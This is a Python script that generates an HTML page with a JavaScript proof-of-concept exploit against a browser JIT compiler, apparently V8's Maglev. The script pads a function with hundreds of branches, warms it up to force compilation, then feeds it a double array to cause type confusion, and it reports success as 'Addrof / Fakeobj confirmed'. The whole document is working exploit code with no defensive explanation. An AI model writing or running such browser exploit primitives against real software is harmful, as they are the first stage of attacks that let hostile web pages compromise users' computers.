N_BLOCKS = 650
lines = []
lines.append('<!DOCTYPE html><html><body><script>')
lines.append('function trigger(x, arr, obj) {')
for i in range(N_BLOCKS):
    lines.append(f'  if (x === {i}) return {i};')
lines.append('  arr[0] = obj;')
lines.append('  let res;')
lines.append('  let cnt = 0;')
lines.append('  while ((res = arr[1]) !== 0) {')
lines.append('    cnt++;')
lines.append('    if (cnt > 0) break;')
lines.append('  }')
lines.append('  return res;')
lines.append('}')
lines.append('''
async function run() {
  console.log("Warming up trigger (25000 iterations)...");
  let dummy = { a: 1 };
  
  // Transition a few double arrays so IC knows the transition
  for (let i = 0; i < 5; i++) {
    let a = [1.1, 2.2, 3.3];
    trigger(1000, a, dummy);
  }

  // Stable warmup
  let stable = [dummy, 2.2, 3.3];
  for (let i = 0; i < 25000; i++) {
    trigger(i, stable, dummy);
  }

  console.log("Warmup done, waiting 4s for Maglev compilation...");
  await new Promise(r => setTimeout(r, 4000));

  console.log("Testing trigger with double array AFTER compilation...");
  let farr = [1.1, 2.2, 3.3];
  let res = trigger(1000, farr, dummy);
  console.log("res type:", typeof res, "res:", res);
  if (typeof res === "object") {
    console.log("SUCCESS!!! res is an object! Addrof / Fakeobj confirmed!", res);
  } else {
    console.log("res is still number:", res);
  }
}
run();
</script></body></html>
''')

with open('script/test_sink_exploit.html', 'w') as f:
    f.write('\n'.join(lines))
print("[+] Generated script/test_sink_exploit.html")
